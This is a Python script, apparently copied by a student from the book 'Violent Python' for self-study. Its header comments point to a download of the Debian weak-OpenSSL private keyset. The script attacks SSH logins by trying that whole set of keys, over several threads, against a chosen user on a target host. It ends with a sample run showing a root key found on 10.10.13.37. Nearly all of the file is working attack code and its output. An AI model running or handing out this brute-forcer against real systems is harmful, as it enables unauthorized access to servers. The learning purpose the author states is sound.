'''
This file is part of examples shown in a book
"Violent Python Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers"
Most of the code is copied as is, or with minor changes to make naming easier to understand and some
comments may have been added where i explain to myself how everything works ( the code is not just blindly copied ).
The purpose of these files is for me to understand how the code works and become better at the security field.
------------
Antti Ruhala, Tampere University of Technology
------------
'''

'''
Third party python module Pexpect is used to interact with SSH
http://pexpect. sourceforge.net
'''
'''
32,767 generated private keys can be downloaded at
http://digitaloffense.net/tools/debianopenssl/
'''
'''
authenticating to ssh with a private key is done with
ssh user@host –i keyﬁle –o PasswordAuthentication=no
'''
import pexpect
import optparse
import os
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0
def connect(user, host, keyfile, release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user +\
            '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied,
                ssh_newkey, conn_closed, '$', '#', ])
        if ret == 2:
            print('[-] Adding Host to ∼/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            Fails += 1
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            Stop = True
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser('usage%prog -H ' + \
            '<target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string',
            help='specify target host')
    parser.add_option('-d', dest='passDir', type='string',
            help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string',
            help='specify the user')
    (options, args) = parser.parse_args()
    host= options.tgtHost
    passDir = options.passDir
    user = options.user
    if host == None or passDir == None or user == None:
        print(parser.usage)
        exit(0)


    for filename in os.listdir(passDir):
                    # gives a list of filenames in directory
        if Stop:
            print('[*] Exiting: Key Found.')
            exit(0)
        if Fails > 5:
            print('[!] Exiting: ' +\
                  'Too many Connections Closed By Remote Host.')
            print('[!] Adjust number of simultaneous threads.')
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print('[-] Testing keyfile ' + str(fullpath))
        t = Thread(target=connect,
                   args=(user, host, fullpath, True))
        child = t.start()
if __name__ == '__main__':
    main()

'''
Example run:
attacker# python WeakPrivateKeys.py -H 10.10.13.37 -u root -d dsa/1024
[-] Testing keyfile tmp/002cc1e7910d61712c1aa07d4a609e7d-16764
[-] Testing keyfile tmp/003d39d173e0ea7ffa7cbcdd9c684375-31965 
[-] Testing keyfile tmp/003e7c5039c07257052051962c6b77a0-9911 
[-] Testing keyfile tmp/002ee4b916d80ccc7002938e1ecee19e-7997 
[-] Testing keyfile tmp/00360c749f33ebbf5a05defe803d816a-31361 
<..SNIPPED..> 
[-] Testing keyfile tmp/002dcb29411aac8087bcfde2b6d2d176-27637 
[-] Testing keyfile tmp/002a7ec8d678e30ac9961bb7c14eb4e4-27909 
[-] Testing keyfile tmp/002401393933ce284398af5b97d42fb5-6059 
[-] Testing keyfile tmp/003e792d192912b4504c61ae7f3feb6f-30448 
[-] Testing keyfile tmp/003add04ad7a6de6cb1ac3608a7cc587-29168 
[+] Success. tmp/002dcb29411aac8087bcfde2b6d2d176-27637 
[-] Testing keyfile tmp/003796063673f0b7feac213b265753ea-13516 
[*] Exiting: Key Found.

'''